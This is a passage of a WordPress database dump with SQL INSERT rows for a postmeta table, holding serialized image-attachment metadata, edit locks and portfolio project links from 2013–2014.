INSERT INTO `cmrfu_postmeta` VALUES("1819","895","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/94.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"94-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"94-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"94-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"94-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"94-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"94-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1820","896","_wp_attached_file","2013/10/105.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1821","896","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/105.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"105-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"105-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"105-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"105-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"105-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"105-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1822","151","er_leaf_project_images","893");
INSERT INTO `cmrfu_postmeta` VALUES("1823","151","er_leaf_project_images","894");
INSERT INTO `cmrfu_postmeta` VALUES("1824","151","er_leaf_project_images","895");
INSERT INTO `cmrfu_postmeta` VALUES("1825","151","er_leaf_project_images","896");
INSERT INTO `cmrfu_postmeta` VALUES("1826","151","_wp_old_slug","rockable");
INSERT INTO `cmrfu_postmeta` VALUES("1827","146","_edit_lock","1401705524:1");
INSERT INTO `cmrfu_postmeta` VALUES("1828","141","_edit_lock","1401705526:1");
INSERT INTO `cmrfu_postmeta` VALUES("1831","899","_wp_attached_file","2013/10/41.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1832","899","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/41.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"41-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"41-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"41-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"41-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"41-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"41-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1833","900","_wp_attached_file","2013/10/67.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1834","900","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/67.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"67-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"67-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"67-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"67-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"67-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"67-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1835","901","_wp_attached_file","2013/10/106.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1836","901","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/106.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"106-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"106-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"106-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"106-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"106-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"106-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1837","902","_wp_attached_file","2013/10/122.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1838","902","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/122.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"122-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"122-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"122-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"122-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"122-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"122-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1839","146","er_leaf_project_images","899");
INSERT INTO `cmrfu_postmeta` VALUES("1840","146","er_leaf_project_images","900");
INSERT INTO `cmrfu_postmeta` VALUES("1841","146","er_leaf_project_images","901");
INSERT INTO `cmrfu_postmeta` VALUES("1842","146","er_leaf_project_images","902");
INSERT INTO `cmrfu_postmeta` VALUES("1843","146","_wp_old_slug","say-it-in-print");
INSERT INTO `cmrfu_postmeta` VALUES("1846","905","_wp_attached_file","2013/10/17.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1847","905","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/17.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"17-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"17-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"17-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"17-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"17-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"17-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1848","906","_wp_attached_file","2013/10/26.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1849","906","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/26.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"26-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"26-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"26-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"26-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"26-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"26-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1850","907","_wp_attached_file","2013/10/52.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1851","907","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/52.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"52-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"52-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"52-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"52-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"52-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"52-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1852","908","_wp_attached_file","2013/10/68.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1853","908","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/68.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"68-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"68-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"68-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"68-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"68-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"68-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1854","141","er_leaf_project_images","905");
INSERT INTO `cmrfu_postmeta` VALUES("1855","141","er_leaf_project_images","906");
INSERT INTO `cmrfu_postmeta` VALUES("1856","141","er_leaf_project_images","907");
INSERT INTO `cmrfu_postmeta` VALUES("1857","141","er_leaf_project_images","908");
INSERT INTO `cmrfu_postmeta` VALUES("1858","141","_wp_old_slug","yokohome");
INSERT INTO `cmrfu_postmeta` VALUES("1859","497","_edit_lock","1409340497:1");
INSERT INTO `cmrfu_postmeta` VALUES("1907","932","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2030","953","_wp_attached_file","2014/08/day_yapi.png");
INSERT INTO `cmrfu_postmeta` VALUES("2031","953","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:20:\"2014/08/day_yapi.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"day_yapi-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"day_yapi-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"day_yapi-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2032","954","_wp_attached_file","2014/08/kabinet.png");
INSERT INTO `cmrfu_postmeta` VALUES("2033","954","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:19:\"2014/08/kabinet.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:19:\"kabinet-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:19:\"kabinet-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:17:\"kabinet-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2034","955","_wp_attached_file","2014/08/KlimaPlus.png");
INSERT INTO `cmrfu_postmeta` VALUES("2035","955","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:21:\"2014/08/KlimaPlus.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"KlimaPlus-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"KlimaPlus-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"KlimaPlus-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2036","956","_wp_attached_file","2014/08/logo_0000_mood.png");
INSERT INTO `cmrfu_postmeta` VALUES("2037","956","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:26:\"2014/08/logo_0000_mood.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:26:\"logo_0000_mood-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:26:\"logo_0000_mood-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:24:\"logo_0000_mood-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2038","957","_wp_attached_file","2014/08/logo_0001_drlight1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2039","957","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:30:\"2014/08/logo_0001_drlight1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"logo_0001_drlight1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"logo_0001_drlight1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"logo_0001_drlight1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2040","958","_wp_attached_file","2014/08/logo_0002_yutas1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2041","958","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:28:\"2014/08/logo_0002_yutas1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"logo_0002_yutas1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"logo_0002_yutas1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"logo_0002_yutas1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2042","959","_wp_attached_file","2014/08/logo_0003_vitra.png");
INSERT INTO `cmrfu_postmeta` VALUES("2043","959","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:27:\"2014/08/logo_0003_vitra.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"logo_0003_vitra-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"logo_0003_vitra-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"logo_0003_vitra-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2044","960","_wp_attached_file","2014/08/logo_0004_viko1.png");
